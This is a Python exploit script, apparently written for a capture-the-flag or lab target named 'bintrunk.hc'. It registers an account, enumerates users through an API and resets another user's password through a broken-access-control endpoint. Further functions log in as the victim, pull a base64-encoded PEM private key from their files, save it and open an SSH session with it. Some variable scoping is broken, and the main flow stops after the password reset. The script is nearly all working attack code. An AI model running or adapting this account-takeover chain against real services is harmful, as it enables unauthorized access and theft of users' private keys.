import requests # type: ignore
import sys
import os
import base64
import argparse


### https://realpython.com/command-line-interfaces-python-argparse/
parser = argparse.ArgumentParser()
parser.add_argument("URL")
#parser.add_argument("-p","--proxy",action="setProxy()")
args = parser.parse_args()

base = sys.argv[1]

url_register = base+"/api/auth/register"
url_login = base+"/api/auth/login"
url_users = base+"/api/v1beta/users"
url_listFiles = base+"/api/files"
url_resetPass = base+"/api/user/reset-password/"#+id do usuário
#print(url_register,url_login,url_users,url_listFiles)

user="teste"
email="teste@teste.com.br"
password="123"
authcode=""
userUID=""
uuid_ldantas=""
extractedUsers={}

#The proxy needs to be an array with specific fields to work with requests
#https://stackoverflow.com/questions/8287628/proxies-with-python-requests-module
#proxy = {"http":"http://localhost:65535"}
#proxy={}

#Request via POST (register)
#https://medium.com/@Hichem_MG/how-to-post-json-data-with-python-requests-259e8497afe2



def createUser():
    print("[+] Creating user!\n")
    requestData = {
        'username' : user,
        'email' : email,
        'password' : password
    }
    s = requests.post(url_register,json=requestData)
    if s.status_code == 200:
        print("[+] USER CREATED SUCESSFULLY!!")
        print("[+] User: teste")
        print("[+] Email: teste@teste.com.br")
        print("[+] Password = 123\n")
    else:
        print(f"{s.content}\n")

def extractAuthCode():
    #Request via POST (login)
    print("[+] Log in and extracting token with our new user! \n")
    requestData = {
        'email':email,
        'password':password
    }
    s = requests.post(url_login,json=requestData).json()
    return s['x-acess-token']
    #print(f"[+] Extracted Authentication Code: {authcode}\n")


def extractUsers(authCode):
    #Request via GET (enum users / ldantas user id)
    print("[+] Extracting Users")
    cabecas = {
        "Authorization": "Bearer "+authCode,
    }
    s = requests.get(url_users,headers=cabecas).json()
    s1 = s['users']
    for response in s1:
        print(f"[+] User ID: {response['id']} / User email = {response['email']}")
        extractedUsers = {response['email']:response['id']}
        if(response['email'] == "ldantas@bintrunk.hc"):
            uuid_ldantas = response['id']

#s = requests.get(url_listFiles,headers=cabecas)
#print(s.json())

def resetUserPass(authCode,userUidParam):
    #Request via POST (post resetpassword)
    print("[+] Reseting ldantas user password!")
    requestData = {
        "password":password,
        "confirm_password":password
    }
    cabecas = {
        "Authorization": "Bearer " + authCode,
    }
    s = requests.post(url_resetPass+userUidParam,headers=cabecas,json=requestData)
    if s.status_code == 200:
        print("[+] Password Reseted Sucessfuly! \n")
    else:
        print(f"{s.content}\n")


def getFiles(user,pw,file):
    #Request via GET (get files)
    print("[+] Logging with ldantas user and extracting his files! \n")
    ##LOGIN COM USUÁRIO LDANTAS
    requestData = {
        'email':"ldantas@bintrunk.hc",
        'password':password
    }
    s = requests.post(url_login,json=requestData).json()
    authcode = s['x-acess-token']
    ###EXTRAINDO ARQUIVOS DO USUÁRIO LDANTAS
    cabecas = {
        "Authorization": "Bearer "+authcode,
    }
    s = requests.get(url_listFiles,headers=cabecas).json()
    print("[+] Extracting PEM file")
    pem_fileName=s['files'][0]
    #print(pem_fileName)
    #print("[+] Conteúdo do arquivo:")
    pem_fileContent = requests.get(url_listFiles+"/"+pem_fileName,headers=cabecas).json()['fileContent']
    #print(pem_fileContent)

def base64Decode():
    print("[+] Converting Base64 to Text! \n") 
    # converting the base64 code into ascii characters
    convertbytes = pem_fileContent.encode("ascii")
    # converting into bytes from base64 system
    convertedbytes = base64.b64decode(convertbytes)
    # decoding the ASCII characters into alphabets
    decodedFileContent = convertedbytes.decode("ascii")
    # displaying the result
    #print(decodedFileContent)


def saveLocalFile(decodedFileContent):
    print("[+] Saving file locally! \n")
    f = open("file.pem","w")
    f.write(decodedFileContent)
    f.close()
    print("[+] Changing File Permission")
    os.system("chmod 400 file.pem")

def sshConn():
    print("[+] SSH Connection in 3... 2... 1...")
    os.system("bash -c 'ssh-keygen -R bintrunk.hc && ssh -i file.pem ldantas@bintrunk.hc'")



createUser()
token = extractAuthCode()
extractUsers(token)
uidPassReset = input("Enter the uid of which user do you want to reset password: ")
resetUserPass(token,uidPassReset)



#REFS:
#https://brightdata.com/faqs/json/extract-json-response-python
#https://medium.com/@Hichem_MG/how-to-post-json-data-with-python-requests-259e8497afe2
#https://www.geeksforgeeks.org/command-line-arguments-in-python/
#https://medium.com/@adwait420gaikwad/scripting-exploits-a-guide-to-python-web-exploit-development-libraries-93ae125ede7e
#https://www.infosecinstitute.com/resources/secure-coding/attacking-web-applications-with-python-exploiting-web-forms-and-requests/
#https://stackoverflow.com/questions/7152762/how-to-redirect-print-output-to-a-file
#https://stackoverflow.com/questions/16249440/changing-file-permission-in-python
#https://stackoverflow.com/questions/1233655/what-is-the-simplest-way-to-ssh-using-python
#https://www.askpython.com/python/examples/decoding-base64-data